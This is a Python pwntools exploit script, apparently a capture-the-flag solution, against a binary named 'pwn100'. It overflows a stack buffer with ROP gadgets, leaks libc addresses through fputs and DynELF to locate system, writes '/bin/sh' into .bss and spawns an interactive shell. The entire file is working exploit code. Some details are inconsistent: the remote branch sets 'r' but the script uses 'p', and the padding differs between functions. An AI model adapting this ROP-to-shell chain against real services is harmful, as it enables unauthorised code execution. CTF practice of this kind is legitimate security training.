from pwn import *
from ctypes import *


DEBUG = 1
if DEBUG:
     p = process('./pwn100')
     context.log_level = 'debug'
else:
     r = remote('172.16.4.93', 13025)

fputs_plt=0x400500
prdi_ret=0x400763
prsi_pr15_ret=0x400761
main_addr=0x4006B8
read_addr=0x400520
bss_addr=0x601060


def leak(addr):
    data='a'*0x47+p64(prdi_ret)+p64(addr)+p64(fputs_plt)+p64(main_addr)
    data=data.ljust(0xc8,'\x00')
    p.send(data)
    data=p.recvuntil('bye~\n')
    data=p.recv()[:-1]
    data+='\x00'
    return data

def pwn():
    
    data='a'*0x48+p64(prdi_ret)+p64(0x601018)+p64(fputs_plt)+p64(main_addr)
    data=data.ljust(0xc8,'\x00')+'\n'
    p.send(data)
    data=p.recvuntil('bye~\n')
    data=p.recv()[:-1]
    
    d = DynELF(leak, elf=ELF('./pwn100'))
    system_addr = d.lookup('system', 'libc')
    print "system_addr:", hex(system_addr)
    
    data='a'*0x47+p64(prdi_ret)+p64(bss_addr)+p64(prsi_pr15_ret)+p64(0x8)+p64(0)+p64(0x40063D)+p64(prdi_ret)+p64(bss_addr)+p64(prsi_pr15_ret)+p64(0x8)+p64(0)+p64(0x40063D)+p64(prdi_ret)+p64(bss_addr)+p64(system_addr)
    data=data.ljust(0xc7,'\x00')
    p.send(data)
    p.send('/bin/sh\x00/bin/sh\x00')
    p.interactive()

if __name__ == '__main__':
   pwn()
    

